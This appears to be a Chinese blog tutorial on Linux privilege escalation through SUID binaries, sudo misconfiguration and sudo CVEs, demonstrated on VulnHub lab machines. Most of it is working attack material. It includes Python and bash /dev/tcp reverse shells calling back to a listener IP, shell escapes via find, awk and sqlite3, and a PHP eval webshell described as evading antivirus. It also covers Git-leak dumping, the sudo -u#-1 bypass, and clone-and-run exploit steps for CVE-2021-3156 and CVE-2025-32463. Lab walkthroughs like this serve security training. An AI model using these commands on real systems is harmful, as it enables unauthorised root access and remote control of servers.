---
title: "2.Linux 权限提升：SUID 机制与 SUDO 配置漏洞利用实战"
slug: linux-privilege-escalation-suid-sudo-cve
cover: ""
date: 2026-01-09
categories:
  - 权限提升
tags:
  - SUDO越权
halo:
  site: http://www.hzhsec.top
  name: 76086461-4a68-4250-8135-8cd1ab032d1c
  publish: true
---

获取到 Web 权限或普通用户在 Linux 服务器上时进行的 SUID & SUDO 提权。


<!--more-->

---

##  基础概念说明

###  SUID (Set owner User ID up on execution)

SUID 是给予文件的一种特殊权限类型。在 Linux / Unix 中，当一个程序运行时会继承执行用户的权限，而 SUID 的作用是让执行者临时继承文件所有者的权限（含 UID、GID）。

###  SUDO 权限

SUDO 是由 `root` 将原本需要超级用户权限才能执行的命令授权给普通用户执行，配置文件为：

```
/etc/sudoers
```

除配置风险外，SUDO 还存在相关漏洞：

```
CVE-2019-14287
CVE-2021-3156
CVE-2025-32463
```

---
##  提权辅助手册参考

```
https://gtfobins.github.io/
```

---

##  SUID 提权

### 1️ SUID & GUID — 自带系统程序提权

**环境：**

```
https://www.vulnhub.com/entry/dc-1,292/
```

开启 NAT 模式
命令运行：`SUID GUID`
入口来自历史漏洞点

![[屏幕截图 2025-10-27 162652.png]]

####  查找 SUID / GUID 文件

```
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

![[屏幕截图 2025-10-27 162814.png]]

####  信息搜集工具：LinEnum & PEASS-ng

 处理脚本换行符

```
sed -i 's/\r$//' LinEnum.sh
```

![[屏幕截图 2025-10-27 163516.png]]

PEASS-ng 扫描结果：
![[屏幕截图 2025-10-27 164016.png]]

####  利用 SUID 执行 Shell

```
/usr/bin/find . -exec '/bin/sh' \;
```

![[屏幕截图 2025-10-27 164227.png]]

---

### 2️ SUID & SUDO — 第三方程序提权

**环境：**

```
https://www.vulnhub.com/entry/toppo-1,245/
```

搭建方式：
创建任意虚拟机 → 替换 `toppo.vmdx`

入口思路：端口扫描 + 路径扫描 → 获取 SSH 密码

![[屏幕截图 2025-10-27 172006.png]]

📌 Python2 反弹 Shell（利用 SUID）：

```
/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.88.145",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![[屏幕截图 2025-10-27 172006.png]]
![[屏幕截图 2025-10-27 172352.png]]

📌 `mawk` 也可读取 Root 权限文件
![[屏幕截图 2025-10-27 172839.png]]

---

##  SUDO & SUDO+CVE 提权

### 1️ 基础 SUDO 配置提权

**环境：**

```
https://www.vulnhub.com/entry/toppo-1,245/
```

查看 sudo 权限：

```
cat /etc/sudoers
```

无需密码的提权方法：

```
/usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

---

### 2️ SUDO-CVE 实战案例

**环境：**

```
https://www.vulnhub.com/entry/devguru-1,620/
```

---

###  利用思路与流程

####  端口及资产识别

```
80, 8585
http://192.168.139.150/.git/
http://192.168.139.150/adminer.php
http://192.168.139.150/backend/
http://192.168.139.150:8585/
http://192.168.139.150:8585/admin
```

####  Git 泄漏利用

```
python GitHack.py http://192.168.139.150/.git/
```

![[屏幕截图 2025-10-27 174328.png]]

####  Web 管理入口 & Shell 注入

利用 adminer.php 添加用户 → 登录后台 → 模板注入 Shell

![[屏幕截图 2025-10-27 174333.png]]
![[屏幕截图 2025-10-27 174425.png]]
![[屏幕截图 2025-10-27 180638.png]]

PHP 免杀写 shell point：

```
function onStart(){
//蚁剑连接
eval($_POST["pass"]);
}
```

####  备份信息提权突破点

![[屏幕截图 2025-10-27 181358.png]]

修改密码文件：

```
/var/backup/app.ini.bak
```

登陆 Gitea 数据库
![[屏幕截图 2025-10-27 181531.png]]

修改密码 Hash：

```
4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb
```

####  Hook 反弹 Shell

![[屏幕截图 2025-10-27 190144.png]]
![[屏幕截图 2025-10-27 190151.png]]

```
bash -c "exec bash -i >& /dev/tcp/192.168.88.145/5555 0>&1"
```

反弹成功图：
![[屏幕截图 2025-10-27 190259.png]]

---

####  利用 sudo 提权 — CVE

查看权限：

```
sudo -l
```

![[屏幕截图 2025-10-27 194253.png]]

发现 `sqlite3` 免密但 root 不可使用 → 需绕过 root 限制

绕过方式：

```
sudo -u#-1
```

正常命令：

```
sqlite3 /dev/null '.shell /bin/sh'
```

CVE 绕过执行：

```
sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'
```

![[屏幕截图 2025-10-27 194722.png]]

---

##  SUDO 漏洞利用合集

###  CVE-2021-3156

**环境**： Kali2020
**受影响版本：**

```
sudo: 1.8.2 - 1.8.31p2
sudo: 1.9.0 - 1.9.5p1
```

检测方式：

```
sudoedit -s /
```

POC：

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
chmod a+x sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich 0
```

---

###  CVE-2025-32463

适用版本：

```
Sudo 1.9.14 ~ 1.9.17
```

![[屏幕截图 2025-10-26 165525.png]]

确保 `/etc/sudoers` 存在 `-R` 权限

下载利用脚本：

```
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
cd CVE-2025-32463_chwoot
```

执行：

```
/sudo-chwoot.sh
```

![[Screenshot_2025-10-26_05_03_14.png]]

 注意

```
sudo 利用必须是本地具有一定 sudo 权限的真实用户
WebShell 用户通常不满足条件
而 SUID 不需要此前提
```